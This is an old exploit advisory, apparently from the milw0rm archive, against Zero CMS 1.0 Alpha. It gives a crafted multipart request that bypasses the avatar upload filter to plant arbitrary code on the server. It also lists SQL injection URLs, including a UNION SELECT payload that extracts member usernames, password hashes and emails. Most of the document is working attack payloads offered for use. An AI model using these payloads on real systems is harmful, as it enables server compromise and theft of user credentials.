@@ -1,0 +1,63 @@
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+ |    ____            __________         __             ____  __      |
+ |  /_   | ____     |__\_____  \  _____/  |_          /_   |/  |_     |
+ |   |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\    |
+ |   |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |      |
+ |   |___|___|  /\__|  /______  /\___  >__|            |___||__|      |
+ |            \/\______|      \/     \/                               |
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+ |    Zero CMS Remote Arbitrary File Upload / SQL Injections          |
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+ |			Version: <= 1.0 Alpha (Last)                  |
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+ |			Vendor: www.zero-cms.com                      |
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+ |			Discovered by: KiNgOfThEwOrLd                 |
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+ |				Intro:                                |
+ |                                                                    |
+ | An attacker can bypass the avatar upload extension filter editing  |
+ |  the contenet type propriety                                       |
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+ |				Exploit:                              |
+ |                                                                    |
+ | Submit to index.php?act=usercp&action=avatar a request like this:  |
+ |                                                                    |
+ |	-----------------------------4629606643545053171986629955\r\n |
+ |	Content-Disposition: form-data; name="MAX_FILE_SIZE"\r\n      |
+ |	\r\n                                                          |
+ |	20000\r\n                                                     |
+ |	-----------------------------4629606643545053171986629955\r\n |
+ |	Content-Disposition: form-data; name="avupload"; filename="   |
+ |	[FILENAME].[EVIL_EXTENSION]"\r\n                              |
+ |	Content-Type: image/jpeg\r\n 				      |
+ |	\r\n							      |
+ |	[EVIL_CODE]\n						      |
+ |	\r\n							      |
+ |	-----------------------------4629606643545053171986629955\r\n |
+ |	Content-Disposition: form-data; name="submit"\r\n	      |
+ |	\r\n							      |
+ |	Upload\r\n						      |
+ |	-----------------------------4629606643545053171986629955-\r\n|
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+ | 				SQL Injections:                       |
+ |                                                                    |
+ | The most of the variable related with the database are not properly|
+ | checked. Then, we get a lots of possible sql injections.           |
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+ |				Some Examples:                        |
+ |                                                                    |
+ |			index.php?act=poll&mode=view&id=%27           |
+ |			forums/index.php?f=%27                        |
+ |			forums/index.php?t=%27                        |
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+ |      		    An Exploit Example:                       |
+ |		                                                      |
+ | index.php?act=poll&mode=view&id=9999+union+all+select+1,username,  |
+ | password,email,5,6,7,8,9,10,11,12,13,14+from+zc_members            |
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+ | Surelly there are other not filtred vars, but i don't feel like to |
+ | check, if u want u can find that yourself, dont you? :P            |
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+
+# milw0rm.com [2008-01-08]
